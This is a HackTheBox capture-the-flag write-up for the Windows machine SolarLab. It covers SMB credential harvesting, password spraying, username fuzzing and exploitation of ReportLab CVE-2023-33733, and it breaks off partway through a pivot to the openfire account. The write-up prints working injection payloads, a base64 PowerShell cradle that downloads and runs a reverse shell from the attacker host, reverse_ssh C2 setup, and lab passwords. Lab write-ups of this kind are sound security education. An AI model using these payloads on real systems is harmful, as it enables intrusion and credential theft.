---
render_with_liquid: false
title: HackTheBox Writeup  SolarLab
date: 2024-05-12 13:57:00 +1400
tags: [hackthebox, nmap, windows, netexec, smb, discover-secrets, password-spraying, python-flask, user-enumeration, ffuf, password-reuse, exiftool, reportlab, cve-2023-33733, python, code-injection, reverse-ssh, enum, sqlite, runascs, openfire, openfire-password-decrypt, embedded-db, hsql]
---



SolarLab is a medium Windows machine that starts with a webpage featuring a business site. Moreover, an SMB share is accessible using a guest session that holds files with sensitive information for users on the remote machine. An attacker can extract valid credentials from this file and log in to a page allowing employees to fill out forms for company purposes. These forms are turned into PDFs using the `ReportLab` library, which is vulnerable to [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/CVE-2023-33733). After some exploit development/modification, the attacker can get code execution as the user `blake` on the remote machine. Further enumeration of the remote machine, reveals that `Openfire` is installed and running locally. By using a SOCKS tunnel, the attacker can access the Administrator Console for Openfire. It turns out, that the version installed, is vulnerable to [CVE-2023-32315](https://nvd.nist.gov/vuln/detail/CVE-2023-32315) which allows the attacker to bypass the authentication screen, upload a malicious plugin, and get code execution as the `openfire` user. The `openfire` user can read the logs from when the server was installed and extract all the necessary information to crack the Administrator&amp;#039;s password and it turns out that this password is re-used for the local `Administrator` account.


# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ pt init '10.129.119.197 solarlab.htb report.solarlab.htb SolarLab'
+----------+--------+----------------+---------------------+
| PROFILE  | STATUS |       IP       |       DOMAIN        |
+----------+--------+----------------+---------------------+
| solarlab | on     | 10.129.119.197 | solarlab.htb        |
| solarlab | on     | 10.129.119.197 | report.solarlab.htb |
| solarlab | on     | 10.129.119.197 | SolarLab            |
+----------+--------+----------------+---------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sun May 12 13:57:00 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80,135,139,445,6791, SolarLab
Nmap scan report for SolarLab (10.129.171.222)
Host is up, received user-set (0.29s latency).
Scanned at 2024-05-12 13:57:00 CST for 139s

PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 nginx 1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
|_http-server-header: nginx/1.24.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
6791/tcp open  http          syn-ack ttl 127 nginx 1.24.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 62435/tcp): CLEAN (Timeout)
|   Check 2 (port 46833/tcp): CLEAN (Timeout)
|   Check 3 (port 13965/udp): CLEAN (Timeout)
|   Check 4 (port 50707/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7s
| smb2-time:
|   date: 2024-05-12T05:58:51
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun May 12 13:59:19 2024 -- 1 IP address (1 host up) scanned in 138.77 seconds
```

## 80 - HTTP : Static site about sonar lab


### Info

```ruby
http://solarlab.htb [200] [SolarLab Instant Messenger] [nginx/1.24.0] [Bootstrap,Nginx:1.24.0] [eed0b0f31e7dbfcf7428ce050ccbf53718f675cf]
```

![](/assets/obsidian/fd1ec0b310dddb294ef7b9b102157e96.png)

## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ nxc smb $(pt get rhost) -u '' -p ''
SMB         10.129.171.222  445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ nxc smb $(pt get rhost) -u 'a' -p ''
SMB         10.129.171.222  445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.129.171.222  445    SOLARLAB         [+] solarlab\a:
```

### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ nxc smb $(pt get rhost) -u 'a' -p '' --shares
SMB         10.129.171.222  445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.129.171.222  445    SOLARLAB         [+] solarlab\a:
SMB         10.129.171.222  445    SOLARLAB         [*] Enumerated shares
SMB         10.129.171.222  445    SOLARLAB         Share           Permissions     Remark
SMB         10.129.171.222  445    SOLARLAB         -----           -----------     ------
SMB         10.129.171.222  445    SOLARLAB         ADMIN$                          Remote Admin
SMB         10.129.171.222  445    SOLARLAB         C$                              Default share
SMB         10.129.171.222  445    SOLARLAB         Documents       READ
SMB         10.129.171.222  445    SOLARLAB         IPC$            READ            Remote IPC
```

### Groups & Users

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ nxc smb $(pt get rhost) -u 'a' -p '' --rid-brute | tee nxc_users.txt
SMB         10.129.171.222  445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.129.171.222  445    SOLARLAB         [+] solarlab\a:
SMB         10.129.171.222  445    SOLARLAB         500: SOLARLAB\Administrator (SidTypeUser)
SMB         10.129.171.222  445    SOLARLAB         501: SOLARLAB\Guest (SidTypeUser)
SMB         10.129.171.222  445    SOLARLAB         503: SOLARLAB\DefaultAccount (SidTypeUser)
SMB         10.129.171.222  445    SOLARLAB         504: SOLARLAB\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.171.222  445    SOLARLAB         513: SOLARLAB\None (SidTypeGroup)
SMB         10.129.171.222  445    SOLARLAB         1000: SOLARLAB\blake (SidTypeUser)
SMB         10.129.171.222  445    SOLARLAB         1001: SOLARLAB\openfire (SidTypeUser)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ cat nxc_users.txt | grep SidTypeUser | awk -F'\' '{print $2}' | awk '{print $1}' | tee users.lst
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
blake
openfire
```

## 6791 - HTTP : ReportHub Login


### Info

```ruby
http://solarlab.htb:6791 [301,200] [Login - ReportHub] [nginx/1.24.0] [Nginx:1.24.0] [http://report.solarlab.htb:6791/] [8333fef271d42bfef02756c290c53a5051f457e6]
```

![](/assets/obsidian/df64e2986b0034eb1abcb59d99ef4bde.png)


# User Flag
---

## Enumeration


### 80 - HTTP : Usernames

- It's a static site
- Gathered some potential usernames

![](/assets/obsidian/5d6a58d938e6e2ab7f325e4f4b5e4030.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ cat users_80.txt
Alexander Knight
Claudia Springer
Blake Byte
```

- Generate potential usernames

```bash
/opt/sectools/misc/username-anarchy/username-anarchy -i users_80.txt > users_80_wordlist.txt
```

### 445 - SMB : Creds in shares

Dump smb shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ /home/kali/scripts/utils/dump_smb.sh $(pt get rhost) 'a' ''
getting file \desktop.ini of size 278 as desktop.ini (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \details-file.xlsx of size 12793 as details-file.xlsx (10.7 KiloBytes/sec) (average 5.5 KiloBytes/sec)
getting file \old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (24.9 KiloBytes/sec) (average 13.0 KiloBytes/sec)
getting file \concepts\Training-Request-Form.docx of size 161337 as concepts/Training-Request-Form.docx (107.1 KiloBytes/sec) (average 39.3 KiloBytes/sec)
getting file \concepts\Travel-Request-Sample.docx of size 30953 as concepts/Travel-Request-Sample.docx (25.8 KiloBytes/sec) (average 36.8 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \My Music\*
NT_STATUS_ACCESS_DENIED listing \My Pictures\*
NT_STATUS_ACCESS_DENIED listing \My Videos\*
```

Upon those documents, found one that contains passwords and usernames: `/Documents/details-file.xlsx`

![](/assets/obsidian/fc98b040152466f4b5987a70f53830ad.png)

> `passwords_xlsx.txt`

```
al;ksdhfewoiuh
dkjafblkjadsfgl
d398sadsknr390
ThisCanB3typedeasily1@
danenacia9234n
dadsfawe9dafkn
```

> `usernames_xlsx.txt`

```
Alexander.knight@gmail.com
KAlexander
Alexander.knight@gmail.com
blake.byte
AlexanderK
ClaudiaS
```

### 6791 - HTTP : Flask

- The web app was reverse proxied by `nginx`, which is odd on windows servers
- Since it doesn't have the `VIEWSTATE` parameters, doesn't seem to be `asp.net` applications

![](/assets/obsidian/134dcd4a69eef74071473dc95e6df5a4.png)

- Found out it's a **Flask** application by decoding the cookie value and google a keyword

![](/assets/obsidian/70c3eacc08d54d1381504aa5d1ef467d.png)

![](/assets/obsidian/78fd080591deb9e62a4f19538ffa0b9a.png)

## Shell as blake

### 445 - SMB : Password spray

- Found `blake`'s credential : `ThisCanB3typedeasily1@`

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ nxc smb $(pt get rhost) -u users.lst -p passwords_xlsx.txt --continue-on-success
SMB         10.129.171.222  445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Administrator:al;ksdhfewoiuh STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Guest:al;ksdhfewoiuh STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [+] solarlab\DefaultAccount:al;ksdhfewoiuh
SMB         10.129.171.222  445    SOLARLAB         [+] solarlab\WDAGUtilityAccount:al;ksdhfewoiuh
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\blake:al;ksdhfewoiuh STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\openfire:al;ksdhfewoiuh STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Administrator:dkjafblkjadsfgl STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Guest:dkjafblkjadsfgl STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\blake:dkjafblkjadsfgl STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\openfire:dkjafblkjadsfgl STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Administrator:d398sadsknr390 STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Guest:d398sadsknr390 STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\blake:d398sadsknr390 STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\openfire:d398sadsknr390 STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Administrator:ThisCanB3typedeasily1@ STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Guest:ThisCanB3typedeasily1@ STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [+] solarlab\blake:ThisCanB3typedeasily1@
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\openfire:ThisCanB3typedeasily1@ STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Administrator:danenacia9234n STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Guest:danenacia9234n STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\openfire:danenacia9234n STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Administrator:dadsfawe9dafkn STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\Guest:dadsfawe9dafkn STATUS_LOGON_FAILURE
SMB         10.129.171.222  445    SOLARLAB         [-] solarlab\openfire:dadsfawe9dafkn STATUS_LOGON_FAILURE
```

### 6791 - Report Hub : Username enumeration (WSTG-IDNT-04)

> http://report.solarlab.htb:6791/login

- The login response will show either `User not found` or `User authentication error.`

![](/assets/obsidian/4246d683afa80ad06e4977613bbb7011.png)

![](/assets/obsidian/9e5a3e2b5f47c14837ba2cef1a226e0f.png)

Save the request file and FUZZ usernames with **ffuf**

> `login.req`

```
POST /login HTTP/1.1
Host: report.solarlab.htb:6791
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://report.solarlab.htb:6791
Connection: close
Referer: http://report.solarlab.htb:6791/login
Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.ZkBzEQ.bX45-xQXXAcd0jOsFqlfSsPLdOk
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

username=FUZZ&password=d398sadsknr390
```

```bash
ffuf -c --request-proto http -request login.req -w usernames_xlsx.txt -fs 2133
```

![](/assets/obsidian/bdb9ad9a424774b72c902919c26b3057.png)

Tried all passwords from `details-file.xlsx` on those two usernames, but none succeed

- The username format is `<First Name><First character of last name>`

Since I know `Blake`'s credential is valid with **netexec**, I will brute force the first character of `Blake`'s last name

> `Blake`'s last name can also be found from the static site on port `80`
{: .prompt-tip }

> `login.req`

```bash
POST /login HTTP/1.1
Host: report.solarlab.htb:6791
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://report.solarlab.htb:6791
Connection: close
Referer: http://report.solarlab.htb:6791/login
Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.ZkBzEQ.bX45-xQXXAcd0jOsFqlfSsPLdOk
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

username=BlakeFUZZ&password=d398sadsknr390
```

```bash
ffuf -c --request-proto http -request login.req -w <(python -c 'import string; print("\n".join([x for x in string.ascii_uppercase]))') -fs 2133
```

- Got `BlakeB`

![](/assets/obsidian/0fd5d90c29c6f16868500fa47b09ecc6.png)

### 6791 - PDF ReportLab library : Python Code Injection (CVE-2023-33733)

> http://report.solarlab.htb:6791/login

- Login with `BlakeB`:`ThisCanB3typedeasily1@`
- There are `4` functions in the dashboard, they are all similar forms to generate PDFs for different purposes

![](/assets/obsidian/b44be729f981f0d1cce17e9bfea4505c.png)

- Leave Request

![](/assets/obsidian/bdfdf0914a5c4f14f38542f547241810.png)

![](/assets/obsidian/03e5875e5e69a0aeb18c15b7edbcbb20.png)

The PDF was generated by the `ReportLab PDF library`

```bash
┌──(bravosec㉿fsociety)-[~/Downloads]
└─$ exiftool -a -u output.pdf
[...]
Producer                        : ReportLab PDF Library - www.reportlab.com
[...]
```

- Google : `ReportLab exploit`

> https://github.com/c53elyas/CVE-2023-33733

- POC :

```python
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

Unfortunately, the `user_input` parameter that holds HTML code have a character limit to `300`, both front-end and back-end will check it

![](/assets/obsidian/138cea373ce32d2c5e1129183561b38a.png)

![](/assets/obsidian/507699ab83444fe6074b260e49c9215d.png)

After enumerating all 4 forms, found a parameter that holds data under `Data Field` in PDF file renders HTML code in each forms, and the field doesn't have character limit

![](/assets/obsidian/2fe2c57f39f26d3147cbb79e861757c1.png)

- **leaveRequest** Form - Parameter : `leave_request`

![](/assets/obsidian/c98bcb8c3f3b88b8ceeb19ddd259a235.png)

![](/assets/obsidian/45f5b7a6da604e7a9b9da57918f90bbc.png)

Skipped the screen shot for below forms

- **trainingRequest** From - Parameter : `training_request`
- **homeOfficeRequest** Form - Parameter : `home_office_request`
- **travelApprovalForm** Form - Parameter : `travel_request`

Check if the exploit works (Using `Travel Approval Form` as example)

```bash
sudo tcpdump -i tun0 icmp -v
```

- Payload :

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.14.21') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
GG
</font></para>
```

![](/assets/obsidian/86c7d31c1274ccef4b9d1f34c5f9e177.png)

Got the callback, it worked

![](/assets/obsidian/a25ef4dabc2826568c7c12257f3e76a7.png)

Get a shell

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ python ~/scripts/windows/powershell_base64.py <(echo "iex (new-object net.webclient).DownloadString('http://10.10.14.21/rev.ps1')")
powershell -ep bypass -nop -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAxAC8AcgBlAHYALgBwAHMAMQAnACkACgA=
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
```

- Payload

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -ep bypass -nop -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAxAC8AcgBlAHYALgBwAHMAMQAnACkACgA=') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
GG
</font></para>
```

```bash
connect to [10.10.14.21] from (UNKNOWN) [10.129.119.197] 56678
Windows PowerShell
Copyright (C) 2013 Microsoft Corporation. All rights reserved.

PS C:\Users\blake\Documents\app> whoami
solarlab\blake
PS C:\Users\blake\Documents\app> cat C:\Users\blake\Desktop\user.txt
fcf90fec2ff08e7f21a5fc4d59117dcb
```

### Reverse SSH - Interactive shell

> https://github.com/NHAS/reverse_ssh

Start server

```bash
cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:443
```

Build the client

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh]
└─$ RSSH_HOMESERVER=10.10.14.71:443 make
```

Download and start the client

```bash
PS C:\Users\blake\Documents\app> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.21/client.exe', '\programdata\client.exe'); \programdata\client.exe 
```

Connect to the client, now I have **ssh**'s functionalities

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ ssh 127.0.0.1 -p 443 ls -t
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
                                      Targets
+------------------------------------------+--------+-------------------------------------+
| IDs                                      | Owners | Version                             |
+------------------------------------------+--------+-------------------------------------+
| 5f312665ce718befd61b3c06d408918b582d1637 | public | SSH-v2.5.1-2-ga237613-windows_amd64 |
| 8731957ca24aa1ebfc8fa061e66a5633e0dd7a6c |        |                                     |
| solarlab.blake.solarlab                  |        |                                     |
| 10.129.119.197:56680                     |        |                                     |
+------------------------------------------+--------+-------------------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ ssh -J 127.0.0.1:443 solarlab.blake.solarlab
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'solarlab.blake.solarlab' (ED25519) to the list of known hosts.
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\blake\Documents\app>
```

# Root Flag
---

## From blake to openfire


### Enumeration

- Current user groups and privileges

```bash
PS C:\Users\blake\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
solarlab\blake S-1-5-21-3606151065-2641007806-2768514320-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

- Users and groups

```bash
PS C:\Users\blake\Documents> Get-LocalGroup | foreach {$groupName = $_.name;Get-LocalGroupMember $groupName | select *, @{n="GroupName";e={$groupName}}} | sort GroupName, SID | ft -group GroupName SID, Name, O
bjectClass


   GroupName: Administrators

SID                                           Name                   ObjectClass
---                                           ----                   -----------
S-1-5-21-3606151065-2641007806-2768514320-500 SOLARLAB\Administrator User


   GroupName: Guests

SID                                           Name           ObjectClass
---                                           ----           -----------
S-1-5-21-3606151065-2641007806-2768514320-501 SOLARLAB\Guest User


   GroupName: IIS_IUSRS

SID      Name              ObjectClass
---      ----              -----------
S-1-5-17 NT AUTHORITY\IUSR Group


   GroupName: System Managed Accounts Group

SID                                           Name                    ObjectClass
---                                           ----                    -----------
S-1-5-21-3606151065-2641007806-2768514320-503 SOLARLAB\DefaultAccount User


   GroupName: Users

SID                                            Name                             ObjectClass
---                                            ----                             -----------
S-1-5-11                                       NT AUTHORITY\Authenticated Users Group
S-1-5-21-3606151065-2641007806-2768514320-1000 SOLARLAB\blake                   User
S-1-5-21-3606151065-2641007806-2768514320-1001 SOLARLAB\openfire                User
S-1-5-4                                        NT AUTHORITY\INTERACTIVE         Group
```

- **Flask** app on port `6791`

```bash
PS C:\Users\blake\Documents\app> ls -Force


    Directory: C:\Users\blake\Documents\app


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/2/2024  12:30 PM                instance
d-----         5/13/2024  10:42 AM                reports
d-----        11/17/2023  10:01 AM                static
d-----        11/17/2023  10:01 AM                templates
d-----         5/13/2024  11:25 AM                __pycache__
-a----        11/17/2023   9:59 AM           1278 app.py
-a----        11/16/2023   2:17 PM            315 models.py
-a----        11/18/2023   6:59 PM           7790 routes.py
-a----          5/2/2024   6:26 PM           3352 utils.py

PS C:\Users\blake\Documents\app> cat .\app.py

# app.py
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
import os

app = Flask(__name__)
app.secret_key = os.urandom(64)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'c:\\users\\blake\\documents\\app\\reports'
login_manager = LoginManager(app)
login_manager.login_view = 'login'
[...]
```

### SQLITE database

Check database file location

```bash
PS C:\Users\blake\Documents\app> (ls -Force -Recurse . -File 2>$null) | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                  LastWriteTime          Length FullName
----   -----                  -------------          ------ --------
[...]
-a---- BUILTIN\Administrators 11/17/2023 12:11:50 PM  12288 C:\Users\blake\Documents\app\reports\instance\users.db
-a---- SOLARLAB\blake         11/18/2023 6:59:40 PM    7790 C:\Users\blake\Documents\app\routes.py
-a---- BUILTIN\Administrators 5/2/2024 12:30:27 PM    12288 C:\Users\blake\Documents\app\instance\users.db
-a---- SOLARLAB\blake         5/2/2024 1:13:06 PM      6540 C:\Users\blake\Documents\app\__pycache__\utils.cpython-311.pyc
-a---- BUILTIN\Administrators 5/2/2024 5:09:19 PM     10121 C:\Users\blake\Documents\app\__pycache__\routes.cpython-311.pyc
-a---- SOLARLAB\blake         5/2/2024 6:23:41 PM      2793 C:\Users\blake\Documents\app\__pycache__\app.cpython-311.pyc
-a---- SOLARLAB\blake         5/2/2024 6:26:05 PM      3352 C:\Users\blake\Documents\app\utils.py
```

Get `users.db`

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ scp -J 127.0.0.1:443 solarlab.blake.solarlab:'C:/Users/blake/Documents/app/instance/users.db' loot/users.db
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'solarlab.blake.solarlab' (ED25519) to the list of known hosts.
users.db
```

Enumerate database

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ sqlite3 loot/users.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .headers on
sqlite> .mode columns
sqlite> .tables
user
sqlite> select * from user;
id  username    password
--  ----------  ----------------------
1   blakeb      ThisCanB3typedeasily1@
2   claudias    007poiuytrewq
3   alexanderk  HotP!fireguard
sqlite>
```

### Password spraying

```bash
PS C:\Users\blake\Documents> iex (new-object net.webclient).DownloadString('http://10.10.14.21/Invoke-RunasCs.ps1')
```

```bash
PS C:\Users\blake\Documents> Get-LocalUser | % { Invoke-RunasCs -LogonType 8 -Username "$_" -Password "007poiuytrewq" -Command "C:\programdata\client.exe"; }
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
```

```bash
PS C:\Users\blake\Documents> Get-LocalUser | % { Invoke-RunasCs -LogonType 8 -Username "$_" -Password "HotP!fireguard" -Command "C:\programdata\client.exe"; }
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
[*] Warning: The function CreateProcessWithLogonW is not compatible with the requested logon type '8'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --re
mote-impersonation and --logon-type.
[*] Warning: The logon for user 'openfire' is limited. Use the flag combination --bypass-uac and --logon-type '5' to obtain a more privileged token.

2024/05/13 11:23:51 Forking

[-] RunasCsException: LogonUser failed with error code: The user name or password is incorrect
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/SolarLab]
└─$ ssh 127.0.0.1 -p 443 ls -t
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
                                      Targets
+------------------------------------------+--------+-------------------------------------+
| IDs                                      | Owners | Version                             |
+------------------------------------------+--------+-------------------------------------+
| 5f312665ce718befd61b3c06d408918b582d1637 | public | SSH-v2.5.1-2-ga237613-windows_amd64 |
| 8731957ca24aa1ebfc8fa061e66a5633e0dd7a6c |        |                                     |
| solarlab.blake.solarlab                  |        |                                     |
| 10.129.119.197:56680                     |        |                                     |
+------------------------------------------+--------+-------------------------------------+
